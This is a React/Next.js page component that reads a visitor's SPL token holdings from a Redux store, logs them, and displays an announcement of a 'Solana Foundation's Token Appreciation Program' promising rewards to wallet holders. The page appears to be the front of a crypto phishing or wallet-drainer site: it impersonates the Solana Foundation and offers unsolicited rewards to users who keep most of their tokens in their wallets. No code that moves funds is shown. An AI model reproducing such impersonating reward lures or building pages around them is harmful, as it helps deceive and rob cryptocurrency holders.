import { getAllSPL } from '@/app/services/redux/getAllSPL'
import React from 'react'

function Body(){
        const splWallet = getAllSPL((state)=>state.walletspl)
        console.log(splWallet)

  return (
    <div className="w-full">
      <div className='w-fit flex  flex-col justify-center py-6 space-y-5 px-2'>
            <div className='w-full text-center lg:text-left text-3xl lg:text-5xl font-bold tracking-wide text-white'>Solana Foundation's Token Appreciation Program: Thank You for Believing in Solana!</div>
            <div className=' text-center  lg:text-left text-white text-sm' style={{lineHeight:"22px"}}>
            We are thrilled to announce the launch of Solana Foundation's Token Appreciation Program, our way of expressing gratitude to each and every user who has shown unwavering support for Solana, even during challenging times. As a token of our appreciation, we are distributing rewards to all users holding 85% or more of their Solana tokens in their wallets, along with any other tokens they may hold. This initiative aims to celebrate and thank our community for their belief in the Solana ecosystem's potential. We deeply appreciate your continued trust and confidence in Solana, and we look forward to a future filled with growth, innovation, and shared success. Thank you for being an integral part of the Solana journey!
            </div>
        </div> 
    </div>
  )
}

export default Body
